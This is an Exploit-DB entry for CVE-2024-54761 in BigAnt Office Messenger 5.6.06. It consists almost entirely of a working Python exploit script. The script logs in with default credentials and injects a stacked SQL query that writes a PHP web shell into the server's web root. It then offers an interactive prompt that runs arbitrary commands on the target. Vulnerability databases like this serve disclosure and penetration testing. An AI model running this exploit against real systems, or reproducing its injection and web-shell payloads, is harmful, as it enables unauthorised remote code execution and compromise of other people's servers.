---
title: [webapps] BigAnt Office Messenger 5.6.06 - SQL Injection
url: https://www.exploit-db.com/exploits/52412
source: Exploit-DB.com RSS Feed
date: 2025-08-19
fetch_date: 2025-10-07T00:16:22.187754
---

# [webapps] BigAnt Office Messenger 5.6.06 - SQL Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# BigAnt Office Messenger 5.6.06 - SQL Injection

#### EDB-ID:

###### 52412

#### CVE:

###### [2024-54761](https://nvd.nist.gov/vuln/detail/CVE-2024-54761)

---

**EDB Verified:**

#### Author:

###### [Nicat Abbasov](/?author=12309)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-18

---

**Vulnerable App:**

```
# Exploit Title: BigAnt Office Messenger 5.6.06 - SQL Injection
# Date: 01.09.2025
# Exploit Author: Nicat Abbasov
# Vendor Homepage: https://www.bigantsoft.com/
# Software Link: https://www.bigantsoft.com/download.html
# Version: 5.6.06
# Tested on: 5.6.06
# CVE : CVE-2024-54761
# Github repo: https://github.com/nscan9/CVE-2024-54761

import requests
from bs4 import BeautifulSoup
import base64

class Exploit:
    def __init__(self, rhost, rport=8000, username='admin', password='123456'):
        self.rhost = rhost
        self.rport = rport
        self.username = username.lower()
        self.password = password
        self.target = f'http://{self.rhost}:{self.rport}'
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': self.target,
            'Referer': f'{self.target}/index.php/Home/login/index.html',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        self.clientid_map = {
            'admin': '1',
            'security': '2',
            'auditor': '3',
            'superadmin': '4',
        }
        self.clientid = self.clientid_map.get(self.username, '4')  # Default to 4 if unknown

    def get_tokens(self):
        print("[*] Fetching login page tokens...")
        url = f'{self.target}/index.php/Home/login/index.html'
        r = self.session.get(url, headers={'User-Agent': self.headers['User-Agent']})
        soup = BeautifulSoup(r.text, 'html.parser')

        tokens = {}
        meta = soup.find('meta', attrs={'name': '__hash__'})
        if meta:
            tokens['__hash__'] = meta['content']

        form = soup.find('form')
        if form:
            for hidden in form.find_all('input', type='hidden'):
                name = hidden.get('name')
                value = hidden.get('value', '')
                if name and name not in tokens:
                    tokens[name] = value

        return tokens

    def login(self):
        tokens = self.get_tokens()
        if '__hash__' in tokens:
            tokens['__hash__'] = tokens['__hash__']

        encoded_password = base64.b64encode(self.password.encode()).decode()

        data = {
            'saas': 'default',
            'account': self.username,
            'password': encoded_password,
            'to': 'admin',
            'app': '',
            'submit': '',
        }
        data.update(tokens)

        login_url = f'{self.target}/index.php/Home/Login/login_post'
        print(f"[*] Logging in as {self.username}...")
        resp = self.session.post(login_url, headers=self.headers, data=data)
        if resp.status_code != 200:
            print(f"[-] Login failed with HTTP {resp.status_code}")
            return False

        try:
            json_resp = resp.json()
            if json_resp.get('status') == 1:
                print("[+] Login successful!")
                return True
            else:
                print(f"[-] Login failed: {json_resp.get('info')}")
                return False
        except:
            print("[-] Failed to parse login response JSON")
            return False

    def check_redirect(self):
        url = f'{self.target}/index.php/admin/public/load/clientid/{self.clientid}.html'
        print(f"[*] Checking for redirect after login to clientid {self.clientid} ...")
        r = self.session.get(url, headers={'User-Agent': self.headers['User-Agent']}, allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] Redirect found to {r.headers.get('Location')}")
            return True
        else:
            print(f"[-] Redirect not found, got HTTP {r.status_code}")
            return False

    def upload_shell(self):
        print("[*] Uploading webshell via SQLi...")
        payload = ';SELECT "<?php system($_GET[\'cmd\']); ?>" INTO OUTFILE \'C:/Program Files (x86)/BigAntSoft/IM Console/im_webserver/htdocs/shell.php\'-- -'
        url = f'{self.target}/index.php/Admin/user/index/clientid/{self.clientid}.html'
        params = {'dev_code': payload}
        r = self.session.get(url, params=params, headers={'User-Agent': self.headers['User-Agent']})
        if r.status_code == 200:
            print("[+] Payload sent, checking the shell...")
            self.check_shell()
        else:
            print(f"[-] Failed to send payload, HTTP {r.status_code}")

    def check_shell(self):
        print("[*] Enter shell commands to execute on the target. Empty command to exit.")
        while True:
            cmd = input("shell> ").strip()
            if not cmd:
                print("[*] Exiting shell.")
                break
            shell_url = f'{self.target}/shell.php?cmd={cmd}'
            print(f"[*] Sending command: {cmd}")
            r = self.session.get(shell_url)
            if r.status_code == 200 and r.text.strip():
                print(r.text.strip())
            else:
                print("[-] No response or empty output from shell.")

    def run(self):
        if self.login():
            if self.check_redirect():
                self.upload_shell()
            else:
                print("[-] Redirect check failed, aborting.")
        else:
            print("[-] Login failed, aborting.")

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description='Exploit for CVE-2024-54761 BigAntSoft  SQLi to RCE')
    parser.add_argument('-r', '--rhost', required=True, help='Target IP address')
    parser.add_argument('-p', '--rport', default=8000, type=int, help='Target port (default 8000)')
    parser.add_argument('-u', '--username', default='admin', help='Login username (default admin)')
    parser.add_argument('-P', '--password', default='123456', help='Login password in plain text')

    args = parser.parse_args()

    exploit = Exploit(args.rhost, args.rport, args.username, args.password)
    exploit.run()
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration...